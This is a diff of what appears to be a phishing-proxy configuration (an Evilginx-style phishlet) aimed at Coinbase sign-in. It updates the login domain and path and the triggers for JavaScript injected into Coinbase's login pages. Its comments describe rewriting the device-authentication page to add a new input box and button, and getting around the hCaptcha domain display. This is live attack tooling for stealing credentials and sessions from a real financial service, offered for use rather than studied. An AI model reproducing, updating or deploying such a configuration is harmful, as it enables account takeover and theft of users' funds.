@@ -44,8 +44,8 @@ force_post:
     type: 'post'
 
 login:
-  domain: 'www.coinbase.com'
-  path: '/signin?login_challenge'
+  domain: 'login.coinbase.com'
+  path: '/signin?'
 
 
 # "function lp()" will dynamically replace the contents in device authentication html page, and will create a new input box and button. Some other replacements are just to make page look better.
@@ -56,7 +56,7 @@ login:
 
 js_inject:
   - trigger_domains: ["login.coinbase.com"]
-    trigger_paths: ["/signin?login_challenge"]
+    trigger_paths: ["/signin?"]
     trigger_params: [domain]
     script: |
       window.onload = function() {
@@ -114,7 +114,7 @@ js_inject:
       
 # HCAPTCHA Header That shows domain name can be Replaced dynamically with javascripts, Its Disabled Here Because Its resulting in Hcaptcha error, Find your ways to solve it.
 #
-#  - trigger_domains: ["login.coinbase.com"]
+#  - trigger_domains: [""]
 #    trigger_paths: [""]
 #    trigger_params: []
 #    script: |
